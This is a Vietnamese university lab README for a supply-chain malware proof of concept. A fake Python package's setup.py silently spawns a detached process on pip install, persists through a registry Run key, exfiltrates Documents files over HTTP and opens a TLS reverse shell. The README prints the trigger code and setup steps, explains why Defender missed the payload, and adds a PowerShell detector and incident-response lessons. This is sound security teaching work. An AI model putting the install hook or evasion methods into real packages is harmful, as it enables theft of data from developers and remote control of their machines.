# 🐍 S04 Supply Chain Software Malware Lab

<div align="center">

![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-5.1-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Attacker-Ubuntu%2024.04.4-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Windows](https://img.shields.io/badge/Victim-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-T1195-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Academic%20PoC-yellow?style=for-the-badge)

**Đồ án môn An toàn Thông tin — Đại học Công nghệ Thông tin (UIT), ĐHQG TP.HCM**

[📋 Tổng quan](#-tổng-quan) • [🏗️ Kiến trúc](#️-kiến-trúc-hệ-thống) • [🔴 Red Team](#-chi-tiết-red-team) • [🔵 Detector](#-detector--blue-team) • [🚀 Triển khai](#-hướng-dẫn-triển-khai-lab) • [📊 Kết quả](#-kết-quả-thực-nghiệm)

</div>

---

> **⚠️ TUYÊN BỐ TRÁCH NHIỆM PHÁP LÝ**
>
> Dự án này được phát triển **chỉ phục vụ mục đích học thuật và giáo dục** trong khuôn khổ đồ án môn An toàn Thông tin. Toàn bộ thực nghiệm được thực hiện trong môi trường máy ảo VMware, mạng **NAT/host-only lab**, giới hạn trong môi trường được cấp phép. **Không sử dụng mã nguồn, quy trình hoặc kịch bản này bên ngoài môi trường lab hợp pháp.**

---

## 📋 Tổng quan

Dự án là một **Proof of Concept (PoC)** mô phỏng kịch bản **Supply Chain Software Malware**: một package Python giả được phát hành qua private PyPI registry nội bộ, sau đó kích hoạt hành vi mô phỏng mã độc khi victim cài đặt bằng `pip install`.

PoC tập trung vào 3 yêu cầu chính của đề tài S04:

| Phần | Nội dung |
|---|---|
| **A — PoC kỹ thuật** | Mô phỏng supply chain compromise thông qua package Python và private registry |
| **B — Evasion / AV observation** | Kiểm chứng payload trong cấu hình Windows Defender lab |
| **C — Detector** | Xây dựng PowerShell detector phát hiện tiến trình Python có kết nối outbound bất thường |

### Điểm nổi bật

| Hạng mục | Chi tiết |
|---|---|
| **TTP chính** | MITRE ATT&CK **T1195.001 — Compromise Software Dependencies and Development Tools** |
| **Vector** | Package Python `safe-demo-pkg` được host trên Dockerized PyPI Server |
|  **Trigger** | Module-level execution trong `setup.py` khi pip/build backend xử lý metadata/build |
|  **Payload mô phỏng** | Persistence qua Registry Run Key, true exfiltration qua HTTP POST, TLS reverse shell |
|  **C2** | HTTP exfil server trong Docker + TLS reverse shell listener `c2_shell.py` trên Ubuntu host |
|  **Phòng thủ** | PowerShell Behavioral Detector giám sát TCP outbound từ tiến trình Python |

---

## 🏗️ Kiến trúc Hệ thống

```text
s04-package-poc/
├── cert.pem                         # Chứng chỉ SSL/TLS public cho reverse shell listener
├── key.pem                          # Khóa bí mật SSL/TLS cho server
├── Dockerfile                       # Image cho C2 exfil server
├── docker-compose.yml               # pypiserver + c2_exfil trên Docker Bridge Network
├── c2_server.py                     # HTTP server nhận dữ liệu exfiltration, port 8080
├── c2_shell.py                      # TLS reverse shell listener, port 4444
├── welcome.html                     # Giao diện pypiserver tùy chỉnh
├── setup.py                         # Package config + module-level trigger
├── README.md                        # Mô tả package
├── safe_demo_pkg/
│   ├── __init__.py                  # Đánh dấu Python package
│   └── marker.py                    # Persistence + Exfiltration + Reverse Shell
├── dist/
│   └── safe-demo-pkg-1.2.tar.gz     # Artifact phân phối sau khi build
└── safe_demo_pkg.egg-info/          # Metadata sinh ra trong quá trình build
```

### Sơ đồ luồng tấn công

```text
[Ubuntu Attacker / Registry]                         [Windows 10 Victim]
        │                                                     │
        │ 1. Build safe-demo-pkg-1.2.tar.gz                   │
        │ 2. Host package qua Dockerized pypiserver :8000     │
        │ 3. Chạy TLS listener c2_shell.py :4444              │
        │ 4. Theo dõi C2 exfil container :8080                │
        │                                                     │
        │                                                     │ pip install safe-demo-pkg
        │                                                     ▼
        │                                           pip/build backend xử lý setup.py
        │                                                     │
        │                                                     ▼
        │                                           module-level growl() kích hoạt
        │                                                     │
        │                                                     ▼
        │                                           Python process ẩn được spawn
        │                                           DETACHED_PROCESS + NO_WINDOW
        │                                                     │
        │ ◀──────────── HTTP POST /exfil :8080 ───────────────│ true_exfiltrate() → T1041
        │ ◀──────────── TLS reverse shell :4444 ──────────────│ reverse_shell() → T1059.006/T1059.003
        │                                                     │ persist_registry() → T1547.001
        ▼                                                     ▼
[Nhận dữ liệu exfil trong Docker logs]           [pip hoàn tất bình thường]
[Nhận shell qua c2_shell.py]                     [Victim khó nhận thấy dấu hiệu trực quan]
```

---

## 🔴 Chi tiết Red Team

### 1. Private registry — Dockerized PyPI Server

PoC dùng `pypiserver` thay vì `python3 -m http.server` để mô phỏng sát hơn hành vi supply chain thực tế. Victim không cần tải trực tiếp file `.tar.gz`; thay vào đó chỉ cần cài package theo tên qua `--index-url`, giống kịch bản developer dùng registry nội bộ của tổ chức.

```yaml
services:
  pypiserver:
    image: pypiserver/pypiserver:latest
    container_name: s04-registry
    ports:
      - "8000:8080"
    volumes:
      - ./dist:/data/packages
      - ./welcome.html:/data/welcome.html
    command: -P . -a . --welcome /data/welcome.html /data/packages

  c2_exfil:
    build: .
    container_name: s04-c2-exfil
    ports:
      - "8080:8080"
```

### 2. TLS reverse shell listener

Reverse shell không dùng `nc` ở phiên bản mới. Listener được viết riêng bằng Python trong `c2_shell.py` để hỗ trợ TLS bằng `cert.pem` và `key.pem`.

```bash
python3 c2_shell.py
```

Trong lab, server dùng self-signed certificate. Phía client không xác minh CA vì đây là môi trường mô phỏng cô lập, không triển khai CA thật.

### 3. Cơ chế kích hoạt — Module-level Execution trong `setup.py`

Điểm cốt lõi của PoC là đoạn `growl()` nằm ở cấp module trong `setup.py`. Khi pip/build backend xử lý file này để chuẩn bị metadata hoặc build package, code ở cấp module có thể được thực thi.

```python
from setuptools import setup
import subprocess, sys

def growl():
    try:
        python_exe = sys.executable
        subprocess.Popen(
            [python_exe, "-c", "from safe_demo_pkg.marker import run_marker; run_marker()"],
            creationflags=0x00000008 | 0x08000000,  # DETACHED_PROCESS | CREATE_NO_WINDOW
            close_fds=True,
            start_new_session=True
        )
    except:
        pass

growl()

setup(
    name='safe-demo-pkg',
    version='1.2',
    packages=['safe_demo_pkg'],
    description='S04 Supply Chain Demo',
)
```

> Lưu ý: README này mô tả cơ chế theo hướng học thuật/lab. Không nên diễn đạt quá mạnh kiểu “vượt qua PEP 517 sandbox”; chính xác hơn là payload có thể được kích hoạt trong quá trình pip/build backend xử lý `setup.py`.

### 4. Payload — `marker.py`

| Hàm | Kỹ thuật | Ý nghĩa trong PoC |
|---|---|---|
| `persist_registry()` | **T1547.001 — Registry Run Keys / Startup Folder** | Ghi key `WindowsSysUpdater` vào `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| `true_exfiltrate()` | **T1041 — Exfiltration Over C2 Channel** | Đọc file `.txt`, `.env`, `config.txt` trong Documents và gửi HTTP POST về C2 |
| `reverse_shell()` | **T1059.006 — Python** + **T1059.003 — Windows Command Shell** | Victim chủ động kết nối outbound về attacker, sau đó thực thi lệnh qua `subprocess.Popen(..., shell=True)` |

#### Persistence note

Persistence hoạt động khi package/module vẫn còn trong môi trường Python. Nếu victim đã `pip uninstall safe-demo-pkg`, Registry key có thể vẫn còn nhưng lệnh `from safe_demo_pkg.marker import run_marker` có thể không chạy lại được vì module đã bị xóa khỏi `site-packages`.

---

## 🔵 Detector / Blue Team

**`detector.ps1`** là PowerShell behavioral detector chạy với quyền Administrator, dùng để phát hiện tiến trình Python có kết nối TCP outbound bất thường.

### Tính năng chính

| Tính năng | Mô tả |
|---|---|
| Phát hiện Python outbound | Kiểm tra các kết nối `Established` có owner process là `python`, `python3`, `pythonw`... |
| Whitelist | Bỏ qua localhost và PyPI CDN/Fastly `151.101.x.x` để giảm false positive |
| Chống spam alert | `$ReportedConnections` lưu kết nối đã cảnh báo |
| Audit log | Ghi log ra `C:\S04Demo\detector_audit.log` |
| Clear state | Chỉ in “System Clear” một lần khi không còn threat |

### Demo cảnh báo

```text
--- S04 ADVANCED BEHAVIORAL DETECTOR IS RUNNING ---
[08:31:05] ALERT: Suspicious Python Outbound!
[!] PID: 6108 | Path: C:\Users\Hong Quan\AppData\Local\Programs\Python\Python312\python.exe | Remote: 192.168.157.134
[08:35:22] System Clear: No active threats detected.
```

### Giới hạn đã biết

| Hạn chế | Giải thích / hướng cải tiến |
|---|---|
| False positive | Python hợp pháp có thể kết nối GitHub, Conda hoặc API khác ngoài whitelist |
| Bypass bằng đổi tên binary | Nếu attacker đóng gói bằng PyInstaller hoặc rename binary, rule theo `ProcessName -match "python"` có thể không bắt được |
| Polling 3 giây | Có detection gap giữa hai lần quét; hướng tốt hơn là ETW hoặc WMI event-driven |
| Cần quyền Administrator | `Get-NetTCPConnection` và `Get-Process` cần chạy PowerShell elevated để có đủ thông tin |

---

## 🚀 Hướng dẫn Triển khai 

> **Môi trường:** Ubuntu 24.04.4 LTS đóng vai trò Attacker/Registry, Windows 10 VM đóng vai trò Victim. Lab chạy trong VMware với mạng NAT/host-only, giới hạn trong môi trường được cấp phép.

### Bước 1 — Chuẩn bị Attacker/Registry trên Ubuntu

```bash
# Cài công cụ cơ bản
sudo apt update
sudo apt install -y python3-venv python3-pip docker.io docker-compose-plugin openssl

# Tạo virtual environment
python3 -m venv myenv
source myenv/bin/activate
pip install build

# Tạo chứng chỉ tự ký cho TLS listener nếu chưa có
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=s04-c2-server"

# Kiểm tra thông tin chứng chỉ
openssl x509 -in cert.pem -noout -subject -issuer -dates
```

### Bước 2 — Build package

```bash
python3 -m build --sdist
# Kết quả kỳ vọng: dist/safe-demo-pkg-1.2.tar.gz
```

### Bước 3 — Khởi động registry và C2 exfil bằng Docker

```bash
sudo docker compose up -d
sudo docker ps
```

- `s04-registry`: pypiserver, expose ra Ubuntu host ở port `8000`
- `s04-c2-exfil`: HTTP C2 exfil server, expose ra Ubuntu host ở port `8080`

### Bước 4 — Mở TLS reverse shell listener

```bash
python3 c2_shell.py
```

### Bước 5 — Theo dõi exfiltration log

Mở một terminal khác trên Ubuntu:

```bash
sudo docker logs s04-c2-exfil -f
```

### Bước 6 — Victim cài package từ private registry

Trên Windows 10 VM:

```powershell
pip install safe-demo-pkg --index-url http://192.168.157.134:8000/simple/ --trusted-host 192.168.157.134
```

Sau khi cài đặt, attacker quan sát được:

| Terminal | Kết quả kỳ vọng |
|---|---|
| `python3 c2_shell.py` | Nhận kết nối TLS reverse shell và prompt `Shell>` |
| `sudo docker logs s04-c2-exfil -f` | Nhận nội dung file nhử từ `Documents` của victim |
| Windows victim | `pip install` hoàn tất bình thường, không hiển thị cửa sổ bất thường |

### Bước 7 — Chạy detector trên Windows

Mở PowerShell với quyền Administrator:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
C:\S04Demo\detector.ps1
```

---

## 📊 Kết quả Thực nghiệm

### Windows Defender Full Scan

| Thành phần | Phiên bản / kết quả |
|---|---|
| Hệ điều hành | Windows 10 Enterprise LTSC Version 21H2, OS Build 19044.7184 |
| Windows Defender | Antimalware Client Version 4.18.26030.3011 |
| Security Intelligence | Antivirus Version 1.449.314.0 |
| Ngày thực nghiệm | 27/04/2026 |
| Scan type | Full Scan — 577,281 files, 34 phút 30 giây |
| Kết quả | Không phát hiện mối đe dọa trong cấu hình lab hiện tại |

> Kết quả trên chỉ chứng minh rằng trong môi trường lab và cấu hình Defender đang dùng, payload chưa bị gắn cờ. Không nên diễn đạt là payload có thể vượt qua mọi AV/EDR hoặc mọi cấu hình Defender nâng cao.

### Tại sao payload ít bị phát hiện trong lab

| Lớp | Giải thích |
|---|---|
| Living off the Land | Payload chạy qua `python.exe`, một interpreter hợp pháp trong môi trường developer |
| Không drop `.exe` độc lập | Mã nằm trong package `.tar.gz` và chạy qua Python ecosystem |
| Module-level execution | Trigger nằm trong `setup.py`, kích hoạt trong quá trình pip/build backend xử lý package |
| Detached process | `DETACHED_PROCESS` + `CREATE_NO_WINDOW` giúp tiến trình con tách khỏi pip và không bật cửa sổ console |
| Không dùng PowerShell làm trigger chính | Payload chạy qua CPython/subprocess, không đi qua PowerShell script engine nên không được AMSI kiểm tra theo cùng cách như PowerShell script |

### VirusTotal static scan

| Chỉ số | Kết quả |
|---|---|
| Artifact | `safe-demo-pkg-1.2.tar.gz` |
| Kết quả | 4/62 engine phát hiện tại thời điểm kiểm tra |
| Ý nghĩa | Củng cố nhận định rằng Python package archive có thể bị nhiều engine bỏ lọt nếu chỉ dựa vào quét tĩnh |
| Giới hạn | Không đại diện cho khả năng phát hiện runtime, EDR, ASR rules hoặc network protection |

---

##  Vòng đời Incident Response Demo

| Bước | Thao tác | Ý nghĩa |
|---|---|---|
| 1 | Detector cảnh báo Python outbound về `192.168.157.134` | Xác định tiến trình nghi vấn |
| 2 | `pip uninstall safe-demo-pkg -y` | Chỉ xóa package khỏi `site-packages`, không dừng tiến trình đang chạy |
| 3 | Chạy lại detector | Vẫn thấy PID Python kết nối C2 |
| 4 | `Get-Process` kiểm tra PID | Xác nhận tiến trình Python detached còn tồn tại |
| 5 | `Stop-Process -Id <PID> -Force` | Cắt kết nối C2 bằng cách kill process |
| 6 | Quan sát phía attacker | Reverse shell bị ngắt; dữ liệu đã exfil vẫn còn trong log C2 |
| 7 | Chạy lại detector | `System Clear: No active threats detected` |

> **Bài học chính:** `pip uninstall` không đồng nghĩa với dừng malware. Cần xử lý tiến trình đang chạy, kiểm tra persistence key và hiểu rằng dữ liệu đã exfiltrate thì không thể thu hồi.

---

## 📚 Tài liệu tham khảo

- [MITRE ATT&CK T1195 — Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)
- [MITRE ATT&CK T1195.001 — Compromise Software Dependencies and Development Tools](https://attack.mitre.org/techniques/T1195/001/)
- [MITRE ATT&CK T1547.001 — Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [MITRE ATT&CK T1041 — Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- [MITRE ATT&CK T1059.006 — Python](https://attack.mitre.org/techniques/T1059/006/)
- [MITRE ATT&CK T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [PEP 517 — A build-system independent format for source trees](https://peps.python.org/pep-0517/)
- [pypiserver — Minimal PyPI server](https://github.com/pypiserver/pypiserver)

---

## 👨‍💻 Tác giả

**Trần Hồng Quân**  
Sinh viên Đại học Công nghệ Thông tin (UIT) — ĐHQG TP.HCM  
Chuyên ngành: An toàn Thông tin

---

<div align="center">
<sub>Dự án này được tạo ra cho mục đích giáo dục. Hãy sử dụng kiến thức một cách có trách nhiệm.</sub>
</div>
